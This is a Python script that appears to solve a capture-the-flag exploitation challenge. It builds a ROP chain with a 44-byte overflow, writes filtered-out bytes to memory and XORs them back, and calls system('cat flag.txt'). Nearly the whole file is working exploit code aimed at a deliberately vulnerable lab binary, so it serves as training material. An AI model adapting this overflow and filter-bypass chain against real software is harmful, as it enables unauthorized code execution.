# the only difference between challenge 4 and this one is the need to XOR chars after writing them
# to memory since a basic filter is applied on our input, so we bypass it by injecting acceptable
# bytes then we XOR them in memory to get what we need
# this method is used (in addition to other methods that accomplish the same goal) when dealing
# with null bytes and delimiters such as \n that will break our input in case of functions such as
# strcpy and others that end processing at a \0 or \n...

# you can definitely create functions to avoid repeating stuff such as a function that will write
# bytes to a specified addr and another that will XOR a byte at an addr by another byte...

import struct

system = 0x80484e0
write = 0x08048893	# mov dword ptr [edi], esi ; ret
pop = 0x08048899	# pop esi ; pop edi ; ret
xor = 0x08048890	# xor byte ptr [ebx], cl ; ret
popxor = 0x08048896	# pop ebx ; pop ecx ; ret
data = 0x0804a038

p = ""

p += "A"*44
p += struct.pack("I", pop)
p += "\x61\x61\x74\x22" # "cat " written as "aat""
p += struct.pack("I", data)
p += struct.pack("I", write)
p += struct.pack("I", popxor)
p += struct.pack("I", data)
p += struct.pack("I", 0x00000002)
p += struct.pack("I", xor)	# xor a by 0x2 to get c
p += struct.pack("I", popxor)
p += struct.pack("I", data+3)
p += struct.pack("I", 0x00000002)
p += struct.pack("I", xor)	# xor " by 0x2 to get <space>
p += struct.pack("I", pop)
p += "\x64\x6c\x61\x67" # "flag" written as "dlag"
p += struct.pack("I", data+4)
p += struct.pack("I", write)
p += struct.pack("I", popxor)
p += struct.pack("I", data+4)
p += struct.pack("I", 0x00000002)
p += struct.pack("I", xor) 	# xor d by 0x2 to get f
p += struct.pack("I", pop)
p += "\x2e\x74\x78\x74"
p += struct.pack("I", data+4+4)
p += struct.pack("I", write)
p += struct.pack("I", system)
p += "\xff\xff\xff\xff"		# ret addr after system can be a legitimate addr such as exit@plt or ret2libc or,...
p += struct.pack("I", data)

print(p)

